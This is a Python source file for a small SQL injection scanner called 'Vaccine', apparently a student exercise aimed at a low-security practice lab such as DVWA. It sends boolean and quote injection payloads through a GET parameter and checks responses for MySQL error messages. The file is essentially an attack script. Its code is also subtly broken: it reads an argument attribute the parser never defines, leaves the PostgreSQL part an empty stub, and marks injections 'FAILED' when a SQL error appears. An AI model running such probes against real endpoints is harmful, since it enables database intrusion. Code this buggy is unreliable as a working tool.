import requests
import argparse     
import shutil 
import os

PHP_SESSID="PHPSESSID=p4gjldgt6r1mi076g8qnqfup83; security=low"


errors = {
    "you have an error in your sql syntax",
}

failed_injection = []
good_injection = []

class Engine:
    injection_union = []
    injection_boolean = []

class MySql:
    injection_boolean = ["\' OR '1'='1 ", "'"]

    def make_request_get(self, url):
        print("Testing MYSQL -- GET...")
        for injection in self.injection_boolean:
            res = requests.get(url, {"id": injection, "Submit": "Submit"}, headers={"Cookie": PHP_SESSID})
            for error in errors:
                if (error in res.content.decode().lower()):
                    print("Injection", injection, ": FAILED")
                    failed_injection.append("Injection" + injection + ": FAILED")
                else:
                    print("Injection", injection, ": OK")
                    good_injection.append("Injection" + injection + ": OK")


class PostgreSql:
    injection_boolean = [""]
    injection_union = [""]

    # def make_request(self):


class Vaccine:
    output_file = "output"
    methods = "GET"
    url = ""

    def __init__(self, args):
        if (args.output is not None):
            self.output_file = args.output_file
        if (args.methods is not None):
            self.methods = args.methods
        if (args.URL is not None):
            self.url = args.URL

    def make_request(self, engine: Engine):
        if (self.methods == "GET"):
            engine.make_request_get(self.url);

    def write_injection(self):
        if (not os.path.exists("output/")):
            os.makedirs("output/")
        with open("output/" + self.output_file, "w+") as f:
            for line in good_injection:
                f.write(line + "\n")
            for line in failed_injection:
                f.write(line + "\n")
        shutil.make_archive(self.output_file, 'zip', "output")
        os.remove("output/" + self.output_file)
        os.rmdir("output/")
            



def init_args():
    parser = argparse.ArgumentParser(
                    prog='Vaccine',
                    description='A program that can perform SQL injection to test the vulnerability of an endpoint',
                    epilog='Made with <3 by hrecolet')
    parser.add_argument('URL')
    parser.add_argument('-o', '--output', type=str)
    parser.add_argument('-X', '--methods',type=str)
    args = parser.parse_args()
    return args

def exec():
    args = init_args()
    vaccine = Vaccine(args)
    postgres_instance = PostgreSql()
    mysql_instance = MySql()
    vaccine.make_request(mysql_instance)
    vaccine.write_injection()

if __name__ == '__main__':
    exec()